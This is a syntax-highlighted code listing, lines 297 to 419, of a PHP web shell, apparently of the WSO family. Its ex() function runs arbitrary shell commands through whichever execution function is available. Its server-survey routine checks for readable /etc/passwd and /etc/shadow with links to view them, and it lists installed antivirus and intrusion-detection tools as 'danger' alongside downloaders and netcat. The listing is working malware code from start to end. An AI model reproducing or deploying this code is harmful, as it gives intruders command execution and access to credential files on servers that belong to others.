<span class="lineno"> 297</span> <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;posix_getgrgid&quot;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;disable_functions&#39;</span><span class="p">],</span> <span class="s1">&#39;posix_getgrgid&#39;</span><span class="p">)</span><span class="o">===</span><span class="k">false</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span> <span class="k">function</span> <span class="nf">posix_getgrgid</span><span class="p">(</span><span class="nv">$p</span><span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="k">false</span><span class="p">;</span> <span class="p">}</span> <span class="p">}</span>
<span class="lineno"> 298</span> <span class="k">function</span> <span class="nf">ex</span><span class="p">(</span><span class="nv">$in</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 299</span>     <span class="nv">$out</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span> 
<span class="lineno"> 300</span>     <span class="k">if</span><span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;exec&#39;</span><span class="p">))</span> <span class="p">{</span> 
<span class="lineno"> 301</span>         <span class="o">@</span><span class="nb">exec</span><span class="p">(</span><span class="nv">$in</span><span class="p">,</span><span class="nv">$out</span><span class="p">);</span> 
<span class="lineno"> 302</span>         <span class="nv">$out</span> <span class="o">=</span> <span class="o">@</span><span class="nb">join</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$out</span><span class="p">);</span> 
<span class="lineno"> 303</span>     <span class="p">}</span><span class="k">elseif</span><span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;passthru&#39;</span><span class="p">))</span> <span class="p">{</span> 
<span class="lineno"> 304</span>         <span class="nb">ob_start</span><span class="p">();</span> 
<span class="lineno"> 305</span>         <span class="o">@</span><span class="nb">passthru</span><span class="p">(</span><span class="nv">$in</span><span class="p">);</span> 
<span class="lineno"> 306</span>         <span class="nv">$out</span> <span class="o">=</span> <span class="nb">ob_get_clean</span><span class="p">();</span> 
<span class="lineno"> 307</span>     <span class="p">}</span><span class="k">elseif</span><span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">))</span> <span class="p">{</span> 
<span class="lineno"> 308</span>         <span class="nb">ob_start</span><span class="p">();</span> 
<span class="lineno"> 309</span>         <span class="o">@</span><span class="nb">system</span><span class="p">(</span><span class="nv">$in</span><span class="p">);</span> 
<span class="lineno"> 310</span>         <span class="nv">$out</span> <span class="o">=</span> <span class="nb">ob_get_clean</span><span class="p">();</span> 
<span class="lineno"> 311</span>     <span class="p">}</span><span class="k">elseif</span><span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;shell_exec&#39;</span><span class="p">))</span> <span class="p">{</span> 
<span class="lineno"> 312</span>         <span class="nv">$out</span> <span class="o">=</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$in</span><span class="p">);</span> 
<span class="lineno"> 313</span>     <span class="p">}</span><span class="k">elseif</span><span class="p">(</span><span class="nb">is_resource</span><span class="p">(</span><span class="nv">$f</span> <span class="o">=</span> <span class="o">@</span><span class="nb">popen</span><span class="p">(</span><span class="nv">$in</span><span class="p">,</span><span class="s2">&quot;r&quot;</span><span class="p">)))</span> <span class="p">{</span> 
<span class="lineno"> 314</span>         <span class="nv">$out</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span> 
<span class="lineno"> 315</span>         <span class="k">while</span><span class="p">(</span><span class="o">!@</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span> 
<span class="lineno"> 316</span>             <span class="nv">$out</span> <span class="o">.=</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span><span class="mi">1024</span><span class="p">);</span> 
<span class="lineno"> 317</span>         <span class="nb">pclose</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span> 
<span class="lineno"> 318</span>     <span class="p">}</span> 
<span class="lineno"> 319</span>     <span class="k">return</span> <span class="nv">$out</span><span class="p">;</span> 
<span class="lineno"> 320</span> <span class="p">}</span> 
<span class="lineno"> 321</span> <span class="k">function</span> <span class="nf">viewSize</span><span class="p">(</span><span class="nv">$s</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 322</span>     <span class="k">if</span><span class="p">(</span><span class="nv">$s</span> <span class="o">&gt;=</span> <span class="mi">1073741824</span><span class="p">)</span> 
<span class="lineno"> 323</span>         <span class="k">return</span> <span class="nb">sprintf</span><span class="p">(</span><span class="s1">&#39;%1.2f&#39;</span><span class="p">,</span> <span class="nv">$s</span> <span class="o">/</span> <span class="mi">1073741824</span> <span class="p">)</span><span class="o">.</span> <span class="s1">&#39; GB&#39;</span><span class="p">;</span> 
<span class="lineno"> 324</span>     <span class="k">elseif</span><span class="p">(</span><span class="nv">$s</span> <span class="o">&gt;=</span> <span class="mi">1048576</span><span class="p">)</span> 
<span class="lineno"> 325</span>         <span class="k">return</span> <span class="nb">sprintf</span><span class="p">(</span><span class="s1">&#39;%1.2f&#39;</span><span class="p">,</span> <span class="nv">$s</span> <span class="o">/</span> <span class="mi">1048576</span> <span class="p">)</span> <span class="o">.</span> <span class="s1">&#39; MB&#39;</span><span class="p">;</span> 
<span class="lineno"> 326</span>     <span class="k">elseif</span><span class="p">(</span><span class="nv">$s</span> <span class="o">&gt;=</span> <span class="mi">1024</span><span class="p">)</span> 
<span class="lineno"> 327</span>         <span class="k">return</span> <span class="nb">sprintf</span><span class="p">(</span><span class="s1">&#39;%1.2f&#39;</span><span class="p">,</span> <span class="nv">$s</span> <span class="o">/</span> <span class="mi">1024</span> <span class="p">)</span> <span class="o">.</span> <span class="s1">&#39; KB&#39;</span><span class="p">;</span> 
<span class="lineno"> 328</span>     <span class="k">else</span> 
<span class="lineno"> 329</span>         <span class="k">return</span> <span class="nv">$s</span> <span class="o">.</span> <span class="s1">&#39; B&#39;</span><span class="p">;</span> 
<span class="lineno"> 330</span> <span class="p">}</span> 
<span class="lineno"> 331</span> 
<span class="lineno"> 332</span> <span class="k">function</span> <span class="nf">perms</span><span class="p">(</span><span class="nv">$p</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 333</span>     <span class="k">if</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0xC000</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0xC000</span><span class="p">)</span><span class="nv">$i</span> <span class="o">=</span> <span class="s1">&#39;s&#39;</span><span class="p">;</span> 
<span class="lineno"> 334</span>     <span class="k">elseif</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0xA000</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0xA000</span><span class="p">)</span><span class="nv">$i</span> <span class="o">=</span> <span class="s1">&#39;l&#39;</span><span class="p">;</span> 
<span class="lineno"> 335</span>     <span class="k">elseif</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x8000</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x8000</span><span class="p">)</span><span class="nv">$i</span> <span class="o">=</span> <span class="s1">&#39;-&#39;</span><span class="p">;</span> 
<span class="lineno"> 336</span>     <span class="k">elseif</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x6000</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x6000</span><span class="p">)</span><span class="nv">$i</span> <span class="o">=</span> <span class="s1">&#39;b&#39;</span><span class="p">;</span> 
<span class="lineno"> 337</span>     <span class="k">elseif</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x4000</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x4000</span><span class="p">)</span><span class="nv">$i</span> <span class="o">=</span> <span class="s1">&#39;d&#39;</span><span class="p">;</span> 
<span class="lineno"> 338</span>     <span class="k">elseif</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x2000</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x2000</span><span class="p">)</span><span class="nv">$i</span> <span class="o">=</span> <span class="s1">&#39;c&#39;</span><span class="p">;</span> 
<span class="lineno"> 339</span>     <span class="k">elseif</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x1000</span><span class="p">)</span><span class="nv">$i</span> <span class="o">=</span> <span class="s1">&#39;p&#39;</span><span class="p">;</span> 
<span class="lineno"> 340</span>     <span class="k">else</span> <span class="nv">$i</span> <span class="o">=</span> <span class="s1">&#39;u&#39;</span><span class="p">;</span> 
<span class="lineno"> 341</span>     <span class="nv">$i</span> <span class="o">.=</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0100</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;r&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">);</span> 
<span class="lineno"> 342</span>     <span class="nv">$i</span> <span class="o">.=</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0080</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;w&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">);</span> 
<span class="lineno"> 343</span>     <span class="nv">$i</span> <span class="o">.=</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0040</span><span class="p">)</span> <span class="o">?</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0800</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;s&#39;</span> <span class="o">:</span> <span class="s1">&#39;x&#39;</span> <span class="p">)</span> <span class="o">:</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0800</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;S&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">));</span> 
<span class="lineno"> 344</span>     <span class="nv">$i</span> <span class="o">.=</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0020</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;r&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">);</span> 
<span class="lineno"> 345</span>     <span class="nv">$i</span> <span class="o">.=</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0010</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;w&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">);</span> 
<span class="lineno"> 346</span>     <span class="nv">$i</span> <span class="o">.=</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0008</span><span class="p">)</span> <span class="o">?</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0400</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;s&#39;</span> <span class="o">:</span> <span class="s1">&#39;x&#39;</span> <span class="p">)</span> <span class="o">:</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0400</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;S&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">));</span> 
<span class="lineno"> 347</span>     <span class="nv">$i</span> <span class="o">.=</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0004</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;r&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">);</span> 
<span class="lineno"> 348</span>     <span class="nv">$i</span> <span class="o">.=</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0002</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;w&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">);</span> 
<span class="lineno"> 349</span>     <span class="nv">$i</span> <span class="o">.=</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0001</span><span class="p">)</span> <span class="o">?</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0200</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;t&#39;</span> <span class="o">:</span> <span class="s1">&#39;x&#39;</span> <span class="p">)</span> <span class="o">:</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0200</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;T&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">));</span> 
<span class="lineno"> 350</span>     <span class="k">return</span> <span class="nv">$i</span><span class="p">;</span> 
<span class="lineno"> 351</span> <span class="p">}</span> 
<span class="lineno"> 352</span> <span class="k">function</span> <span class="nf">viewPermsColor</span><span class="p">(</span><span class="nv">$f</span><span class="p">)</span> <span class="p">{</span>  
<span class="lineno"> 353</span>     <span class="k">if</span> <span class="p">(</span><span class="o">!@</span><span class="nb">is_readable</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span> 
<span class="lineno"> 354</span>         <span class="k">return</span> <span class="s1">&#39;&lt;font color=#FF0000&gt;&lt;b&gt;&#39;</span><span class="o">.</span><span class="nx">perms</span><span class="p">(</span><span class="o">@</span><span class="nb">fileperms</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span><span class="o">.</span><span class="s1">&#39;&lt;/b&gt;&lt;/font&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 355</span>     <span class="k">elseif</span> <span class="p">(</span><span class="o">!@</span><span class="nb">is_writable</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span> 
<span class="lineno"> 356</span>         <span class="k">return</span> <span class="s1">&#39;&lt;font color=white&gt;&lt;b&gt;&#39;</span><span class="o">.</span><span class="nx">perms</span><span class="p">(</span><span class="o">@</span><span class="nb">fileperms</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span><span class="o">.</span><span class="s1">&#39;&lt;/b&gt;&lt;/font&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 357</span>     <span class="k">else</span> 
<span class="lineno"> 358</span>         <span class="k">return</span> <span class="s1">&#39;&lt;font color=#00BB00&gt;&lt;b&gt;&#39;</span><span class="o">.</span><span class="nx">perms</span><span class="p">(</span><span class="o">@</span><span class="nb">fileperms</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span><span class="o">.</span><span class="s1">&#39;&lt;/b&gt;&lt;/font&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 359</span> <span class="p">}</span> 
<span class="lineno"> 360</span> <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;scandir&quot;</span><span class="p">))</span> <span class="p">{</span> 
<span class="lineno"> 361</span>     <span class="k">function</span> <span class="nf">scandir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 362</span>         <span class="nv">$dh</span>  <span class="o">=</span> <span class="nb">opendir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">);</span> 
<span class="lineno"> 363</span>         <span class="k">while</span> <span class="p">(</span><span class="k">false</span> <span class="o">!==</span> <span class="p">(</span><span class="nv">$filename</span> <span class="o">=</span> <span class="nb">readdir</span><span class="p">(</span><span class="nv">$dh</span><span class="p">)))</span> <span class="p">{</span> 
<span class="lineno"> 364</span>             <span class="nv">$files</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$filename</span><span class="p">;</span> 
<span class="lineno"> 365</span>         <span class="p">}</span> 
<span class="lineno"> 366</span>         <span class="k">return</span> <span class="nv">$files</span><span class="p">;</span> 
<span class="lineno"> 367</span>     <span class="p">}</span> 
<span class="lineno"> 368</span> <span class="p">}</span> 
<span class="lineno"> 369</span> <span class="k">function</span> <span class="nf">which</span><span class="p">(</span><span class="nv">$p</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 370</span>     <span class="nv">$path</span> <span class="o">=</span> <span class="nx">ex</span><span class="p">(</span><span class="s1">&#39;which &#39;</span><span class="o">.</span><span class="nv">$p</span><span class="p">);</span> 
<span class="lineno"> 371</span>     <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$path</span><span class="p">))</span> 
<span class="lineno"> 372</span>         <span class="k">return</span> <span class="nv">$path</span><span class="p">;</span> 
<span class="lineno"> 373</span>     <span class="k">return</span> <span class="k">false</span><span class="p">;</span> 
<span class="lineno"> 374</span> <span class="p">}</span> 
<span class="lineno"> 375</span> <span class="k">function</span> <span class="nf">actionSecInfo</span><span class="p">()</span> <span class="p">{</span> 
<span class="lineno"> 376</span>     <span class="nx">printHeader</span><span class="p">();</span> 
<span class="lineno"> 377</span>     <span class="k">echo</span> <span class="s1">&#39;&lt;h1&gt;Server security information&lt;/h1&gt;&lt;div class=content&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 378</span>     <span class="k">function</span> <span class="nf">showSecParam</span><span class="p">(</span><span class="nv">$n</span><span class="p">,</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 379</span>         <span class="nv">$v</span> <span class="o">=</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span> 
<span class="lineno"> 380</span>         <span class="k">if</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 381</span>             <span class="k">echo</span> <span class="s1">&#39;&lt;span&gt;&#39;</span><span class="o">.</span><span class="nv">$n</span><span class="o">.</span><span class="s1">&#39;: &lt;/span&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 382</span>             <span class="k">if</span><span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$v</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> 
<span class="lineno"> 383</span>                 <span class="k">echo</span> <span class="nv">$v</span><span class="o">.</span><span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 384</span>             <span class="k">else</span> 
<span class="lineno"> 385</span>                 <span class="k">echo</span> <span class="s1">&#39;&lt;pre class=ml1&gt;&#39;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s1">&#39;&lt;/pre&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 386</span>         <span class="p">}</span> 
<span class="lineno"> 387</span>     <span class="p">}</span> 
<span class="lineno"> 388</span>      
<span class="lineno"> 389</span>     <span class="nx">showSecParam</span><span class="p">(</span><span class="s1">&#39;Server software&#39;</span><span class="p">,</span> <span class="o">@</span><span class="nb">getenv</span><span class="p">(</span><span class="s1">&#39;SERVER_SOFTWARE&#39;</span><span class="p">));</span> 
<span class="lineno"> 390</span>     <span class="nx">showSecParam</span><span class="p">(</span><span class="s1">&#39;Disabled PHP Functions&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;disable_functions&#39;</span><span class="p">])</span><span class="o">?</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;disable_functions&#39;</span><span class="p">]</span><span class="o">:</span><span class="s1">&#39;none&#39;</span><span class="p">);</span> 
<span class="lineno"> 391</span>     <span class="nx">showSecParam</span><span class="p">(</span><span class="s1">&#39;Open base dir&#39;</span><span class="p">,</span> <span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">));</span> 
<span class="lineno"> 392</span>     <span class="nx">showSecParam</span><span class="p">(</span><span class="s1">&#39;Safe mode exec dir&#39;</span><span class="p">,</span> <span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s1">&#39;safe_mode_exec_dir&#39;</span><span class="p">));</span> 
<span class="lineno"> 393</span>     <span class="nx">showSecParam</span><span class="p">(</span><span class="s1">&#39;Safe mode include dir&#39;</span><span class="p">,</span> <span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s1">&#39;safe_mode_include_dir&#39;</span><span class="p">));</span> 
<span class="lineno"> 394</span>     <span class="nx">showSecParam</span><span class="p">(</span><span class="s1">&#39;cURL support&#39;</span><span class="p">,</span> <span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;curl_version&#39;</span><span class="p">)</span><span class="o">?</span><span class="s1">&#39;enabled&#39;</span><span class="o">:</span><span class="s1">&#39;no&#39;</span><span class="p">);</span> 
<span class="lineno"> 395</span>     <span class="nv">$temp</span><span class="o">=</span><span class="k">array</span><span class="p">();</span> 
<span class="lineno"> 396</span>     <span class="k">if</span><span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;mysql_get_client_info&#39;</span><span class="p">))</span> 
<span class="lineno"> 397</span>         <span class="nv">$temp</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&quot;MySql (&quot;</span><span class="o">.</span><span class="nb">mysql_get_client_info</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;)&quot;</span><span class="p">;</span> 
<span class="lineno"> 398</span>     <span class="k">if</span><span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;mssql_connect&#39;</span><span class="p">))</span> 
<span class="lineno"> 399</span>         <span class="nv">$temp</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&quot;MSSQL&quot;</span><span class="p">;</span> 
<span class="lineno"> 400</span>     <span class="k">if</span><span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;pg_connect&#39;</span><span class="p">))</span> 
<span class="lineno"> 401</span>         <span class="nv">$temp</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&quot;PostgreSQL&quot;</span><span class="p">;</span> 
<span class="lineno"> 402</span>     <span class="k">if</span><span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;oci_connect&#39;</span><span class="p">))</span> 
<span class="lineno"> 403</span>         <span class="nv">$temp</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&quot;Oracle&quot;</span><span class="p">;</span> 
<span class="lineno"> 404</span>     <span class="nx">showSecParam</span><span class="p">(</span><span class="s1">&#39;Supported databases&#39;</span><span class="p">,</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">&#39;, &#39;</span><span class="p">,</span> <span class="nv">$temp</span><span class="p">));</span> 
<span class="lineno"> 405</span>     <span class="k">echo</span> <span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 406</span>      
<span class="lineno"> 407</span>     <span class="k">if</span><span class="p">(</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;os&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;nix&#39;</span> <span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 408</span>         <span class="nv">$userful</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;gcc&#39;</span><span class="p">,</span><span class="s1">&#39;lcc&#39;</span><span class="p">,</span><span class="s1">&#39;cc&#39;</span><span class="p">,</span><span class="s1">&#39;ld&#39;</span><span class="p">,</span><span class="s1">&#39;make&#39;</span><span class="p">,</span><span class="s1">&#39;php&#39;</span><span class="p">,</span><span class="s1">&#39;perl&#39;</span><span class="p">,</span><span class="s1">&#39;python&#39;</span><span class="p">,</span><span class="s1">&#39;ruby&#39;</span><span class="p">,</span><span class="s1">&#39;tar&#39;</span><span class="p">,</span><span class="s1">&#39;gzip&#39;</span><span class="p">,</span><span class="s1">&#39;bzip&#39;</span><span class="p">,</span><span class="s1">&#39;bzip2&#39;</span><span class="p">,</span><span class="s1">&#39;nc&#39;</span><span class="p">,</span><span class="s1">&#39;locate&#39;</span><span class="p">,</span><span class="s1">&#39;suidperl&#39;</span><span class="p">);</span> 
<span class="lineno"> 409</span>         <span class="nv">$danger</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;kav&#39;</span><span class="p">,</span><span class="s1">&#39;nod32&#39;</span><span class="p">,</span><span class="s1">&#39;bdcored&#39;</span><span class="p">,</span><span class="s1">&#39;uvscan&#39;</span><span class="p">,</span><span class="s1">&#39;sav&#39;</span><span class="p">,</span><span class="s1">&#39;drwebd&#39;</span><span class="p">,</span><span class="s1">&#39;clamd&#39;</span><span class="p">,</span><span class="s1">&#39;rkhunter&#39;</span><span class="p">,</span><span class="s1">&#39;chkrootkit&#39;</span><span class="p">,</span><span class="s1">&#39;iptables&#39;</span><span class="p">,</span><span class="s1">&#39;ipfw&#39;</span><span class="p">,</span><span class="s1">&#39;tripwire&#39;</span><span class="p">,</span><span class="s1">&#39;shieldcc&#39;</span><span class="p">,</span><span class="s1">&#39;portsentry&#39;</span><span class="p">,</span><span class="s1">&#39;snort&#39;</span><span class="p">,</span><span class="s1">&#39;ossec&#39;</span><span class="p">,</span><span class="s1">&#39;lidsadm&#39;</span><span class="p">,</span><span class="s1">&#39;tcplodg&#39;</span><span class="p">,</span><span class="s1">&#39;sxid&#39;</span><span class="p">,</span><span class="s1">&#39;logcheck&#39;</span><span class="p">,</span><span class="s1">&#39;logwatch&#39;</span><span class="p">,</span><span class="s1">&#39;sysmask&#39;</span><span class="p">,</span><span class="s1">&#39;zmbscap&#39;</span><span class="p">,</span><span class="s1">&#39;sawmill&#39;</span><span class="p">,</span><span class="s1">&#39;wormscan&#39;</span><span class="p">,</span><span class="s1">&#39;ninja&#39;</span><span class="p">);</span> 
<span class="lineno"> 410</span>         <span class="nv">$downloaders</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;wget&#39;</span><span class="p">,</span><span class="s1">&#39;fetch&#39;</span><span class="p">,</span><span class="s1">&#39;lynx&#39;</span><span class="p">,</span><span class="s1">&#39;links&#39;</span><span class="p">,</span><span class="s1">&#39;curl&#39;</span><span class="p">,</span><span class="s1">&#39;get&#39;</span><span class="p">,</span><span class="s1">&#39;lwp-mirror&#39;</span><span class="p">);</span> 
<span class="lineno"> 411</span>         <span class="nx">showSecParam</span><span class="p">(</span><span class="s1">&#39;Readable /etc/passwd&#39;</span><span class="p">,</span> <span class="o">@</span><span class="nb">is_readable</span><span class="p">(</span><span class="s1">&#39;/etc/passwd&#39;</span><span class="p">)</span><span class="o">?</span><span class="s2">&quot;yes &lt;a href=&#39;#&#39; onclick=&#39;g(</span><span class="se">\&quot;</span><span class="s2">FilesTools</span><span class="se">\&quot;</span><span class="s2">, </span><span class="se">\&quot;</span><span class="s2">/etc/</span><span class="se">\&quot;</span><span class="s2">, </span><span class="se">\&quot;</span><span class="s2">passwd</span><span class="se">\&quot;</span><span class="s2">)&#39;&gt;[view]&lt;/a&gt;&quot;</span><span class="o">:</span><span class="s1">&#39;no&#39;</span><span class="p">);</span> 
<span class="lineno"> 412</span>         <span class="nx">showSecParam</span><span class="p">(</span><span class="s1">&#39;Readable /etc/shadow&#39;</span><span class="p">,</span> <span class="o">@</span><span class="nb">is_readable</span><span class="p">(</span><span class="s1">&#39;/etc/shadow&#39;</span><span class="p">)</span><span class="o">?</span><span class="s2">&quot;yes &lt;a href=&#39;#&#39; onclick=&#39;g(</span><span class="se">\&quot;</span><span class="s2">FilesTools</span><span class="se">\&quot;</span><span class="s2">, </span><span class="se">\&quot;</span><span class="s2">etc</span><span class="se">\&quot;</span><span class="s2">, </span><span class="se">\&quot;</span><span class="s2">shadow</span><span class="se">\&quot;</span><span class="s2">)&#39;&gt;[view]&lt;/a&gt;&quot;</span><span class="o">:</span><span class="s1">&#39;no&#39;</span><span class="p">);</span> 
<span class="lineno"> 413</span>         <span class="nx">showSecParam</span><span class="p">(</span><span class="s1">&#39;OS version&#39;</span><span class="p">,</span> <span class="o">@</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">&#39;/proc/version&#39;</span><span class="p">));</span> 
<span class="lineno"> 414</span>         <span class="nx">showSecParam</span><span class="p">(</span><span class="s1">&#39;Distr name&#39;</span><span class="p">,</span> <span class="o">@</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">&#39;/etc/issue.net&#39;</span><span class="p">));</span> 
<span class="lineno"> 415</span>         <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;safe_mode&#39;</span><span class="p">])</span> <span class="p">{</span> 
<span class="lineno"> 416</span>             <span class="k">echo</span> <span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 417</span>             <span class="nv">$temp</span><span class="o">=</span><span class="k">array</span><span class="p">();</span> 
<span class="lineno"> 418</span>             <span class="k">foreach</span> <span class="p">(</span><span class="nv">$userful</span> <span class="k">as</span> <span class="nv">$item</span><span class="p">)</span> 
<span class="lineno"> 419</span>                 <span class="k">if</span><span class="p">(</span><span class="nx">which</span><span class="p">(</span><span class="nv">$item</span><span class="p">)){</span><span class="nv">$temp</span><span class="p">[]</span><span class="o">=</span><span class="nv">$item</span><span class="p">;}</span> 
